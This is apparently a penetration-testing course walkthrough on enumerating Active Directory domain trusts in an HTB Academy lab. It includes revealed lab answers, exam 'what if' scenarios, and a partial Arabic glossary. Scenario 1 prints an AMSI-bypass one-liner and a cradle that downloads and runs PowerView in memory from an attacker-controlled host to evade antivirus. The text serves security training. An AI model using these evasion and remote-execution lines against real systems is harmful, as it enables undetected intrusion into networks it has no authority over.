| Category | Tools |
|---|---|
| **Native Windows** | `netdom`, `nltest`, `Get-ADTrust` |
| **Offensive PowerShell** | `PowerView` (`Get-DomainTrust`, `Get-DomainTrustMapping`) |
| **Visual** | `BloodHound` |

---

# 2️⃣ SIX DISTINCT SOLUTION APPROACHES

## 🔧 SETUP FIRST: Connect via RDP

Before running ANY command, you must connect to the target machine.

**On your Kali/Parrot Linux attack box, open a terminal:**

```bash
xfreerdp /v:10.129.111.130 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution /drive:share,/tmp
```

> 💡 **What this does:** Opens a Remote Desktop session to the Windows machine.
> - `/v:` = target IP
> - `/u:` = username
> - `/p:` = password
> - `/dynamic-resolution` = resizes window automatically

Once connected, **open PowerShell as Administrator** by right-clicking the Start Menu → "Windows PowerShell".

---

## ✅ APPROACH 1 — Using `Get-ADTrust` (Built-in PowerShell AD Module)

**Difficulty:** ⭐☆☆☆☆ (Easiest — native Windows tool, no imports needed)

**What it is:** `Get-ADTrust` is part of the `ActiveDirectory` PowerShell module that comes pre-installed on Domain Controllers and machines with RSAT tools.

### The Command:

```powershell
# Run in PowerShell on the target machine
Import-Module ActiveDirectory
Get-ADTrust -Filter *
```

> 💡 `Import-Module ActiveDirectory` loads the AD toolkit. `Filter *` means "show me ALL trusts."

### Expected Output (Visual Example):

```
Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1a2b3c4d-...
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TrustAttributes         : 8
TrustDirection          : 3
TrustType               : Uplevel

Direction               : BiDirectional
...
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
IntraForest             : True
IsTreeParent            : True
```

### Reading the Output:

| Field | Meaning |
|---|---|
| `Name` | The **other** domain in the trust relationship |
| `Direction: BiDirectional` | **Both** domains trust each other |
| `ForestTransitive: True` | This is a **Forest Trust** (crosses forest boundaries) |
| `IntraForest: True` | This is **within** the same forest (parent-child) |
| `IsTreeParent: True` | INLANEFREIGHT.LOCAL is the **parent** of this domain |

**From this output, you can directly answer:**
- **Q1:** Look for `IsTreeParent: True` or `IntraForest: True` → `LOGISTICS.INLANEFREIGHT.LOCAL`
- **Q2:** Look for `ForestTransitive: True` → `FREIGHTLOGISTICS.LOCAL`
- **Q3:** Look at `Direction` field → `BiDirectional`

### Failure Scenarios:

| Failure | Why it Happens | Error Message |
|---|---|---|
| `Import-Module ActiveDirectory` fails | RSAT/AD module not installed | `"The specified module 'ActiveDirectory' was not loaded"` |
| `Access Denied` | You don't have rights to query AD | `"Access is denied"` |
| No output at all | Machine is not domain-joined | Silent — no results |

### 🔴 Pivot Trigger:

> Stop and move to Approach 2 **immediately** if you see:
> `"The term 'Get-ADTrust' is not recognized"` or the module fails to import.

---

## ✅ APPROACH 2 — Using `Get-DomainTrust` (PowerView)

**Difficulty:** ⭐⭐☆☆☆

**What it is:** PowerView is part of the `PowerSploit` framework — the *de facto* offensive PowerShell toolkit for AD enumeration. It's more powerful than native tools in many ways and is **heavily tested on CPTS**.

### Setup — Load PowerView:

```powershell
# First, bypass execution policy (needed to run scripts)
Set-ExecutionPolicy Bypass -Scope Process -Force

# Import PowerView (it should be on the ACADEMY machine already)
Import-Module C:\Tools\PowerView.ps1
```

> 💡 If PowerView isn't there, you can transfer it from your attack box using the `/drive:share` RDP mount we set up earlier.

### The Command:

```powershell
Get-DomainTrust
```

### Expected Output:

```
SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 AM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM
```

**This is beautifully clean output:**
- **Q1 Answer:** `LOGISTICS.INLANEFREIGHT.LOCAL` (TrustAttributes: `WITHIN_FOREST`)
- **Q2 Answer:** `FREIGHTLOGISTICS.LOCAL` (TrustAttributes: `FOREST_TRANSITIVE`)
- **Q3 Answer:** `Bidirectional`

### Failure Scenarios:

| Failure | Why | Solution |
|---|---|---|
| `File not found` for PowerView.ps1 | Wrong path | Run `Get-ChildItem C:\Tools\ -Recurse \| Where-Object Name -like "*PowerView*"` to find it |
| AV blocks the import | Windows Defender detects PowerView | Use AMSI bypass (covered in What-If scenarios) |
| `UnauthorizedAccess` | Execution policy blocks scripts | Run `Set-ExecutionPolicy Bypass -Scope Process` first |

### 🔴 Pivot Trigger:

> Stop if AV quarantines `PowerView.ps1` immediately upon import. Move to Approach 3.

---

## ✅ APPROACH 3 — Using `Get-DomainTrustMapping` (PowerView — Recursive)

**Difficulty:** ⭐⭐⭐☆☆

**What it is:** This PowerView function goes **further** than `Get-DomainTrust` — it recursively maps ALL trusts across the **entire discovered network**, not just the current domain.

### The Command:

```powershell
Import-Module C:\Tools\PowerView.ps1
Get-DomainTrustMapping
```

> 💡 Think of `Get-DomainTrust` as asking "who are YOUR friends?" and `Get-DomainTrustMapping` as asking "who are YOUR friends' friends, and THEIR friends?"

### Expected Output:

```
SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional

SourceName      : FREIGHTLOGISTICS.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
```

> 💡 Notice how it also maps trusts **from** FREIGHTLOGISTICS.LOCAL — it's truly recursive!

### Failure Scenarios:

| Failure | Why |
|---|---|
| Hangs indefinitely | Network issues reaching trusted domain DCs |
| Incomplete results | Firewall blocking LDAP port 389 to remote domain |
| Same as Approach 2 failures | PowerView dependency |

### 🔴 Pivot Trigger:

> If the command hangs for more than 60 seconds with no output, press `Ctrl+C` and move to Approach 4.

---

## ✅ APPROACH 4 — Using `netdom` (Native Windows CLI Tool)

**Difficulty:** ⭐⭐☆☆☆ (Native tool — no imports needed!)

**What it is:** `netdom` is a built-in Windows command-line tool for managing domain relationships. It's older but extremely reliable since it's always present on Windows systems.

### Command 1 — Query Trust Relationships:

```cmd
netdom query /domain:INLANEFREIGHT.LOCAL trust
```

### Expected Output:

```
The command completed successfully.

List of domain trusts:
    (direct) LOGISTICS.INLANEFREIGHT.LOCAL (NT 5) (Direct Outbound) ( Attr: 0x20 )
    (direct) FREIGHTLOGISTICS.LOCAL (NT 5) (Direct Outbound) ( Attr: 0x8 )
```

### Command 2 — Query Domain Controllers:

```cmd
netdom query /domain:INLANEFREIGHT.LOCAL DC
```

### Expected Output:

```
List of domain controllers with accounts in the domain:

ACADEMY-EA-DC01
The command completed successfully.
```

### Command 3 — Query Workstations and Servers:

```cmd
netdom query /domain:INLANEFREIGHT.LOCAL workstation
```

### Expected Output:

```
List of workstations with accounts in the domain:

ACADEMY-EA-MS01
ACADEMY-EA-WEB01
...
The command completed successfully.
```

### Failure Scenarios:

| Failure | Why |
|---|---|
| `'netdom' is not recognized` | Running on a non-domain machine or netdom not in PATH | 
| `Access is denied` | Insufficient permissions |
| Limited trust details | `netdom` doesn't show `ForestTransitive` attribute as clearly |

### 🔴 Pivot Trigger:

> If `netdom` output is ambiguous about trust TYPE (forest vs. external), use it only to confirm existence, then use Approach 1 or 2 for type details.

---

## ✅ APPROACH 5 — Using `nltest` (Another Native Windows Tool)

**Difficulty:** ⭐⭐☆☆☆

**What it is:** `nltest` (NetLogon Test) is used to perform operations on the domain. One of its functions is listing trusted domains.

### The Command:

```cmd
nltest /domain_trusts
```

### Expected Output:

```
List of domain trusts:
    0: LOGISTICS LOGISTICS.INLANEFREIGHT.LOCAL (NT 5) (Direct Outbound) ( Attr: 0x20 ) ( ChNext: )
    1: FREIGHTLOGISTICS FREIGHTLOGISTICS.LOCAL (NT 5) (Direct Outbound) ( Attr: 0x8 ) ( ChNext: )
The command completed successfully
```

### Deeper Query — Check Specific Trust:

```cmd
nltest /trusted_domains
```

### Another Useful Command:

```cmd
# Find the Domain Controller for a specific domain
nltest /dsgetdc:INLANEFREIGHT.LOCAL
```

### Expected Output:

```
           DC: \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
      Address: \\172.16.5.5
     Dom Guid: ...
     Dom Name: INLANEFREIGHT.LOCAL
  Forest Name: INLANEFREIGHT.LOCAL
 Dc Site Name: Default-First-Site-Name
Our Site Name: Default-First-Site-Name
        Flags: PDC GC DS LDAP KDC TIMESERV WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE FULL_SECRET WS DS_8 DS_9 DS_10 KEYLIST
The command completed successfully.
```

### Failure Scenarios:

| Failure | Why |
|---|---|
| `ERROR_NO_TRUST_SAM_ACCOUNT` | The trust is broken/incomplete |
| `Error_access_denied` | Not enough privileges |
| Output doesn't include trust type clearly | `nltest` is older and less detailed — supplement with PowerView |

### 🔴 Pivot Trigger:

> `nltest` is best used as a **quick confirmation tool**. If you need detailed attributes like `ForestTransitive`, move to Approach 1 or 2.

---

## ✅ APPROACH 6 — Using BloodHound (Visual Graph Analysis)

**Difficulty:** ⭐⭐⭐⭐⭐ (Most powerful — visual + attack path analysis)

**What it is:** BloodHound is the ultimate AD attack analysis tool. It creates a **visual graph** of ALL objects in AD (users, groups, computers, trusts) and shows you attack paths. Think of it as Google Maps for Active Directory attacks.

### Step 1 — Run SharpHound (Data Collector) on the Target:

```powershell
# On the Windows target machine
cd C:\Tools\
.\SharpHound.exe -c All --zipfilename INLANEFREIGHT_data.zip
```

> 💡 `SharpHound` is the **data collector** for BloodHound. It queries AD and saves everything into a zip file.

### Expected Output During Collection:

```
2022-03-01T13:58:22.2810631-05:00|INFORMATION|This version of SharpHound is compatible with the 4.1 Release of BloodHound
2022-03-01T13:58:22.5598738-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-03-01T13:58:22.5598738-05:00|INFORMATION|Initializing SharpHound at 1:58 PM on 3/1/2022
...
2022-03-01T14:00:12.6535342-05:00|INFORMATION|SharpHound Enumeration Completed at 2:00 PM on 3/1/2022!
 Finished writing to zip file.
```

### Step 2 — Transfer the Zip to Your Attack Box:

```bash
# On Kali — copy from the RDP shared drive
cp /tmp/share/INLANEFREIGHT_data.zip ~/bloodhound_data/
```

### Step 3 — Start BloodHound on Your Attack Box:

```bash
# Start Neo4j database (BloodHound's backend)
sudo neo4j start

# Wait ~30 seconds, then open BloodHound
bloodhound &
```

### Step 4 — Upload Data and Search:

1. Login to BloodHound GUI (default: `neo4j:neo4j`)
2. Click **"Upload Data"** → select your zip file
3. Wait for ingestion to complete
4. In the **Search Bar**, type: `INLANEFREIGHT.LOCAL`
5. Click on the domain node

### What You'll See:

```
[Visual Graph showing:]

INLANEFREIGHT.LOCAL ←→ FREIGHTLOGISTICS.LOCAL  (Forest Trust, Bidirectional)
        |
        ↓
LOGISTICS.INLANEFREIGHT.LOCAL  (Child Domain, Parent-Child Trust)
```

### BloodHound Cypher Query (Advanced):

```cypher
// Find all domain trusts
MATCH p=(n:Domain)-[r:TrustedBy]->(m:Domain) RETURN p
```

### Failure Scenarios:

| Failure | Why |
|---|---|
| SharpHound blocked by AV | Defender detects it as offensive tool |
| Neo4j fails to start | Port 7474 already in use |
| BloodHound shows no trust nodes | Data collection was incomplete |
| `Error uploading data` | Wrong BloodHound/SharpHound version mismatch |

### 🔴 Pivot Trigger:

> If SharpHound is immediately killed by AV, use `Invoke-BloodHound` (PowerShell version) or fall back to PowerView approaches.

---

# 🎯 THE DEFINITIVE ANSWERS

Based on the HTB Academy CPTS environment:

<details>
<summary><strong>🔓 Click to Reveal Answers</strong></summary>

### Question 1: Child Domain of INLANEFREIGHT.LOCAL

```
LOGISTICS.INLANEFREIGHT.LOCAL
```

> **Why:** LOGISTICS is the child domain within the same forest (IntraForest = True, Parent-Child trust).

---

### Question 2: Forest Transitive Trust Domain

```
FREIGHTLOGISTICS.LOCAL
```

> **Why:** This is a completely separate forest that INLANEFREIGHT.LOCAL has established a Forest Transitive Trust with.

---

### Question 3: Trust Direction

```
Bidirectional
```

> **Why:** Both forests trust each other — users from INLANEFREIGHT can access FREIGHTLOGISTICS resources AND vice versa. This is common in corporate mergers/partnerships and is a **critical attack vector** in penetration tests.

</details>

---

# 3️⃣ THE "WHAT IF" MASTERCLASS — 6 CPTS Exam Scenarios

---

## 🔥 Scenario 1: "What if PowerView is blocked by Windows Defender?"

**Situation:** You try to `Import-Module C:\Tools\PowerView.ps1` but Windows Defender immediately quarantines it.

**You'll see:**
```
Import-Module : File C:\Tools\PowerView.ps1 cannot be loaded because 
the content of the file is blocked by your anti-malware software.
```

**Solution — AMSI Bypass + In-Memory Execution:**

```powershell
# Step 1: Bypass AMSI (Anti-Malware Scan Interface) in memory
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Step 2: Load PowerView directly into memory from your attack box
# (Never touch disk — AV can't scan RAM as easily)
IEX (New-Object Net.WebClient).DownloadString('http://YOUR_ATTACK_IP/PowerView.ps1')

# Step 3: Now run your commands
Get-DomainTrust
```

> ⚠️ **CPTS Note:** AMSI bypasses are a core exam skill. The above one-liner patches the AMSI initialization flag in the current PowerShell process.

---

## 🔥 Scenario 2: "What if you're on a non-domain-joined machine?"

**Situation:** You've compromised a machine but it's a workgroup machine, not joined to `INLANEFREIGHT.LOCAL`. Commands return nothing.

**You'll see:**
```powershell
Get-ADTrust -Filter *
# Returns nothing / error about domain not found
```

**Solution — Use `runas` with domain credentials to query remotely:**

```powershell
# Method 1: Use PowerView with explicit domain credentials
$cred = Get-Credential  # Enter: INLANEFREIGHT\htb-student / Academy_student_AD!
Get-DomainTrust -Domain INLANEFREIGHT.LOCAL -Credential $cred

# Method 2: Use nltest pointing to a specific DC
nltest /server:10.129.111.130 /domain_trusts

# Method 3: Use LDAP query directly
([System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(
  (New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', 'INLANEFREIGHT.LOCAL','htb-student','Academy_student_AD!'))
)).GetAllTrustRelationships()
```

---

## 🔥 Scenario 3: "What if the child domain DC is not reachable?"

**Situation:** You know `LOGISTICS.INLANEFREIGHT.LOCAL` exists from trust enumeration, but you can't communicate with it directly (firewall rules).

**Solution — Use BloodHound data or LDAP enumeration from a trusted machine:**

```powershell
# Query users IN the child domain from the parent domain's DC
# PowerView can reach child domain via parent DC if trust is intact
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL

# Or enumerate the child domain's DC
Get-DomainController -Domain LOGISTICS.INLANEFREIGHT.LOCAL

# If those fail, use nltest to verify DC status
nltest /dsgetdc:LOGISTICS.INLANEFREIGHT.LOCAL
```

> 💡 If the child DC is unreachable, document it and focus on **SID History attacks** and **cross-domain group memberships** which work through the parent DC.

---

## 🔥 Scenario 4: "What if you need to find users in trusted domains for privilege escalation?"

**Situation:** You've confirmed `FREIGHTLOGISTICS.LOCAL` is in a bidirectional trust. Now you want to find privileged users there who might have access to `INLANEFREIGHT.LOCAL`.

**Solution:**

```powershell
Import-Module C:\Tools\PowerView.ps1

# Step 1: Find all users in the TRUSTED forest
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL | Select-Object samaccountname, description

# Step 2: Find groups in trusted domain
Get-DomainGroup -Domain FREIGHTLOGISTICS.LOCAL | Select-Object name

# Step 3: CRITICAL - Find foreign group memberships
# (Users from FREIGHTLOGISTICS who are in INLANEFREIGHT groups!)
Get-DomainForeignGroupMember -Domain INLANEFREIGHT.LOCAL

# Step 4: Find foreign user memberships  
Get-DomainForeignUser
```

> 🎯 **Why this matters for CPTS:** Foreign group memberships are a PRIMARY attack vector in cross-forest scenarios. If a user from `FREIGHTLOGISTICS.LOCAL` is in the `Domain Admins` group of `INLANEFREIGHT.LOCAL`, you can compromise the entire INLANEFREIGHT forest by first attacking FREIGHTLOGISTICS.

---

## 🔥 Scenario 5: "What if the trust relationship shows as One-Way instead of Bidirectional?"

**Situation:** `Get-DomainTrust` shows:

```
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustDirection  : Inbound
```

**This means:** Only `FREIGHTLOGISTICS.LOCAL` users can access `INLANEFREIGHT.LOCAL`. The reverse is NOT true.

**Understanding the Directions:**

```
                     INBOUND TRUST
INLANEFREIGHT.LOCAL  ←←←←←←←←←  FREIGHTLOGISTICS.LOCAL
(trusting domain)                  (trusted domain)

→ Users FROM FREIGHTLOGISTICS can access resources IN INLANEFREIGHT
→ But INLANEFREIGHT users CANNOT access FREIGHTLOGISTICS resources
```

**Attack implication:**

```powershell
# If trust is INBOUND to INLANEFREIGHT, look for:
# 1. FREIGHTLOGISTICS users with INLANEFREIGHT group memberships
Get-DomainForeignGroupMember

# 2. Kerberoastable users in FREIGHTLOGISTICS that have INLANEFREIGHT access
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -SPN | Select-Object samaccountname, serviceprincipalname
```

> 💡 **CPTS Exam Tip:** The question asks for direction — the answer format they expect is typically `Bidirectional` or `Inbound` or `Outbound`. Based on HTB Academy's environment, the answer is `Bidirectional`.

---

## 🔥 Scenario 6: "What if you need to perform this enumeration from your Linux attack box without RDPing?"

**Situation:** The RDP service is down, but you have valid credentials. You need to enumerate trusts from Kali Linux.

**Solution — Use `ldapsearch`, `rpcclient`, or `CrackMapExec`:**

```bash
# Method 1: CrackMapExec (fastest)
crackmapexec ldap 10.129.111.130 -u htb-student -p 'Academy_student_AD!' --trusted-for-delegation

# Method 2: ldapsearch (manual LDAP query)
ldapsearch -H ldap://10.129.111.130 \
  -D "htb-student@INLANEFREIGHT.LOCAL" \
  -w 'Academy_student_AD!' \
  -b "CN=System,DC=INLANEFREIGHT,DC=LOCAL" \
  "(objectClass=trustedDomain)" \
  name trustDirection trustType trustAttributes

# Method 3: rpcclient
rpcclient -U "htb-student%Academy_student_AD!" 10.129.111.130 -c "enumdomains"

# Method 4: Impacket's GetADUsers.py
python3 /opt/impacket/examples/GetADUsers.py \
  -all INLANEFREIGHT.LOCAL/htb-student:'Academy_student_AD!' \
  -dc-ip 10.129.111.130

# Method 5: windapsearch
python3 windapsearch.py \
  --dc-ip 10.129.111.130 \
  -u htb-student@INLANEFREIGHT.LOCAL \
  -p 'Academy_student_AD!' \
  --custom "(objectClass=trustedDomain)"
```

**`ldapsearch` Trust Direction Decoder:**

| `trustDirection` Value | Meaning |
|---|---|
| `0` | Disabled |
| `1` | Inbound (they trust us) |
| `2` | Outbound (we trust them) |
| `3` | **Bidirectional** ← This is what you'll find |

---

# 📊 COMPLETE COMMAND REFERENCE CHEATSHEET

```powershell
# ============================================
# NATIVE ACTIVE DIRECTORY MODULE
# ============================================
Import-Module ActiveDirectory
Get-ADTrust -Filter *
Get-ADTrust -Identity "INLANEFREIGHT.LOCAL"
Get-ADForest | Select-Object Domains, Name, RootDomain
(Get-ADForest).Domains  # Lists ALL domains in forest

# ============================================
# POWERVIEW (OFFENSIVE)
# ============================================
Import-Module C:\Tools\PowerView.ps1
Get-DomainTrust                          # Current domain trusts
Get-DomainTrust -Domain INLANEFREIGHT.LOCAL  # Specific domain
Get-DomainTrustMapping                   # RECURSIVE all trusts
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL  # Users in child domain
Get-DomainController -Domain LOGISTICS.INLANEFREIGHT.LOCAL
Get-DomainForeignGroupMember             # Cross-domain group memberships

# ============================================
# NATIVE WINDOWS CLI
# ============================================
netdom query /domain:INLANEFREIGHT.LOCAL trust
netdom query /domain:INLANEFREIGHT.LOCAL DC
netdom query /domain:INLANEFREIGHT.LOCAL workstation
nltest /domain_trusts
nltest /trusted_domains
nltest /dsgetdc:INLANEFREIGHT.LOCAL

# ============================================
# FROM LINUX ATTACK BOX
# ============================================
crackmapexec smb 10.129.111.130 -u htb-student -p 'Academy_student_AD!' --shares
ldapsearch -H ldap://10.129.111.130 -D "htb-student@INLANEFREIGHT.LOCAL" -w 'Academy_student_AD!' -b "CN=System,DC=INLANEFREIGHT,DC=LOCAL" "(objectClass=trustedDomain)"
```

---

# 🗺️ Visual: The INLANEFREIGHT Trust Map

```
                    ┌─────────────────────────┐
                    │    INLANEFREIGHT.LOCAL   │
                    │    (Forest Root / Parent) │
                    └────────────┬────────────┘
                                 │
                    Parent-Child Trust (Automatic)
                    Bidirectional + Transitive
                    IntraForest = TRUE
                                 │
                                 ▼
                    ┌─────────────────────────┐
                    │ LOGISTICS.INLANEFREIGHT  │  ← ANSWER Q1
                    │        .LOCAL            │
                    │   (Child Domain)         │
                    └─────────────────────────┘

                    
┌─────────────────────────┐          ┌─────────────────────────┐
│    INLANEFREIGHT.LOCAL   │◄────────►│   FREIGHTLOGISTICS.LOCAL │
│    (Forest 1 Root)       │          │   (Forest 2 Root)        │
└─────────────────────────┘          └─────────────────────────┘
         Forest Transitive Trust          ← ANSWER Q2
         ForestTransitive = TRUE
         Direction: BIDIRECTIONAL         ← ANSWER Q3
```

---

> 💡 **Final Tip for CPTS Success:** Domain trust enumeration is ALWAYS one of your **first steps** after gaining initial access to an AD environment. Before trying to escalate privileges, map ALL trusts — you might find a much easier path to Domain Admin through a trusted (but weaker) domain!

---

```
  ══════════════════════════════════════════════════════════════════
  [✓] PHASE_II ATTACK SEQUENCES DOCUMENTED
  [✓] 6 / 6 EXPLOITATION METHODS CAPTURED
  [→] LOADING DEEP-DIVE ANALYSIS & GLOSSARY . . .
  ══════════════════════════════════════════════════════════════════
```

---

## 🔴 PHASE_III — دليل الاختراق :: التحليل والمصطلحات

> [!warning] ⚠️ PHASE III INITIALIZED · EXPLOITATION GUIDE & GLOSSARY **Language:** Arabic + English Mixed — **Size:** ~2,000 Words **Content:** Arabic breakdown of all 6 methods · Flashcards · Cheat Sheet · Golden Tips.

---

تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

🟢 المرحلة 0: ما قبل الصفر — Big Picture (الصورة الكبيرة)

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

تخيل وياي إنك مسافر وتريد تدخل لدولة ثانية. إذا دولتك عندها "اتفاقية إعفاء من التأشيرة" أو "علاقات دبلوماسية قوية" وية هاي الدولة، راح تكدر تدخل بجواز سفرك العادي بدون ما تطلع جنسية جديدة أو جواز جديد من دولتهم. جوازك (هويتك) معترف بيه عندهم لأن اكو "ثقة" بين الحكومتين.

  

بالضبط هذا هو مفهوم الـ **Domain Trusts (علاقات الثقة)** ببيئة الـ Active Directory الخاصة بمايكروسوفت.

  

ليش هذا المفهوم موجود أصلاً؟

الشركات الكبيرة ما تتكون من فرع واحد، ومو دائماً تبقى على حالها. الشركات تشتري شركات ثانية (استحواذ)، أو تندمج وياها، أو تفتح فروع بدول مختلفة.

تخيل شركة اسمها INLANEFREIGHT اشترت شركة ثانية اسمها FREIGHTLOGISTICS. موظفين الشركة الأولى يحتاجون يدخلون على سيرفرات الشركة الثانية، والعكس صحيح. من المستحيل والمزعج جداً لمدير الـ IT إنه يسوي حساب جديد لكل موظف بالشركتين!

الحل؟ يربطون الـ Domain مال الشركة الأولى بالـ Domain مال الشركة الثانية عن طريق "Trust" (علاقة ثقة). بهيج حالة، الموظف يكدر يستخدم نفس اليوزر والباسورد مالته حتى يوصل لملفات وطابعات وسيرفرات الشركة الثانية.

  

وين يجي دورنا كـ Hackers أو Penetration Testers؟

الخلل الجوهري اللي نستغله هنانا مو "ثغرة برمجية" أو "خطأ بالكود"، وإنما **"استغلال للتصميم" (Abuse of Features)**.

إذا احنا اخترقنا حاسبة موظف عادي بالشركة الصغرى (أو الفرع الضعيف حمايته)، واكتشفنا اكو "علاقة ثقة" وية الشركة الأم (اللي حمايتها قوية وبها كل الفلوس والبيانات)، نكدر نستخدم هذي الثقة كـ "جسر" (Pivot) حتى نعبر من الـ Domain الضعيف ونسيطر على الـ Domain القوي!

مايكروسوفت نفسها تكول: "الـ Domain ليس هو حدود الأمان (Security Boundary)، بل الـ Forest هي حدود الأمان". ولكن حتى الـ Forest ممكن اختراقها إذا اكو Forest Trust مكوّن بشكل يمسح بصلاحيات واسعة!

  

شنو راح نتعلم من هذا التحدي؟

١. كيف نستطلع بيئة الـ Active Directory ونرسم خريطة لكل علاقات الثقة المخفية.

٢. كيف نعرف منو يثق بمنو؟ (اتجاه الثقة يحدد منو يقدر يخترق منو).

٣. كيف نميز بين الفروع التابعة لنفس الشركة (Child Domains) وبين الشركات الخارجية (External Forests).

٤. كيف نستخدم أدوات الـ Windows المدمجة وأدوات الهجوم المتقدمة (مثل PowerView) حتى نطلع هاي المعلومات الدقيقة.

  

بالنهاية، التعداد (Enumeration) الصح هو اللي يخليك كـ Red Teamer تندل طريقك، بدل ما تضرب بالعمى وتنكشف من قبل الـ Blue Team!

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

🔵 المرحلة 1: المصطلحات

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

قبل ما نكتب أي أمر، لازم نفهم لغة الـ Active Directory. هاي المصطلحات هي الخبز والماء لأي مختبر اختراق شبكات Windows:

  

Active Directory (AD) (الدليل النشط)

  

- شنو يعني؟ هو الدماغ أو السجل المركزي لأي شبكة Windows للشركات. يخزن كل اليوزرات، الباسوردات، السيرفرات، والصلاحيات بمكان واحد.
    
      
    
- مثال بسيط: مثل دليل الهاتف بس للشبكة، يقرر منو يقدر يسجل دخول وعلى أي حاسبة.
    
      
    

Domain (المجال)

  

- شنو يعني؟ هو مجموعة من الحواسيب واليوزرات اللي تخضع لإدارة مركزية واحدة. عادة يكون اسمه مثل موقع الويب (مثلاً `INLANEFREIGHT.LOCAL`).
    
      
    
- مثال بسيط: قسم معين بالشركة، أو فرع بدولة معينة، له قوانينه ويوزراته الخاصة.
    
      
    

Domain Controller / DC (متحكم المجال)

  

- شنو يعني؟ هو السيرفر الرئيسي (أو السيرفرات) اللي يشغل الـ Active Directory. هو اللي يتحقق من اليوزر والباسورد من تسجل دخول.
    
      
    
- وين يظهر؟ راح نشوف اسمه بالـ logs والـ enumeration، وإذا سيطرت عليه = سيطرت على كل الـ Domain.
    
      
    

Forest (الغابة)

  

- شنو يعني؟ هي أكبر حدود تنظيمية بالـ AD. تتكون من Domain واحد أو أكثر. كل الـ Domains داخل نفس الـ Forest يثقون ببعضهم تلقائياً (عن طريق Parent-Child trusts).
    
      
    
- مثال بسيط: الإمبراطورية الكاملة للشركة.
    
      
    

Domain Trust (علاقة الثقة)

  

- شنو يعني؟ الرابط المنطقي بين اثنين Domains اللي يخليهم يشاركون الموارد (Resources).
    
      
    

Transitive Trust (الثقة المتعدية)

  

- شنو يعني؟ قانون رياضي بسيط: إذا A يثق بـ B، و B يثق بـ C، إذن A يثق بـ C تلقائياً.
    
      
    
- وين تظهر؟ داخل الـ Forest الواحدة، كل الثقات Transitive. هذا يعني لو اخترقت أضعف Domain، تكدر توصل لأي Domain ثاني متصل بيه بالشبكة.
    
      
    

Non-Transitive Trust (الثقة غير المتعدية)

  

- شنو يعني؟ الثقة تقف عند الطرفين فقط. إذا A يثق بـ B، و B يثق بـ C، فإن A لا يثق بـ C. لازم A يسوي ثقة منفصلة وية C مباشرة.
    
      
    

Direction of Trust (اتجاه الثقة)

  

- شنو يعني؟ نقطة جداً حرجة للمخترقين! تحدد "الوصول يروح وين؟".
    
      
    - **One-Way Inbound (الداخلية):** Domain A يثق بـ Domain B. (مستخدمين B يكدرون يدخلون على A).
        
          
        
    - **One-Way Outbound (الخارجية):** Domain B يثق بـ Domain A. (مستخدمين A يكدرون يدخلون على B).
        
          
        
    - **Bidirectional / Two-Way (ثنائية الاتجاه):** كل واحد يثق بالثاني، والوصول متبادل للجهتين.
        
          
        

Parent-Child Trust (ثقة الأصل والفرع)

  

- شنو يعني؟ لما الشركة تفتح فرع جديد تحت اسمها. مثلاً `LOGISTICS.INLANEFREIGHT.LOCAL` هو Child تحت `INLANEFREIGHT.LOCAL`. هاي الثقة تتأسس تلقائياً وتكون Two-Way و Transitive.
    
      
    

Forest Trust (ثقة الغابات)

  

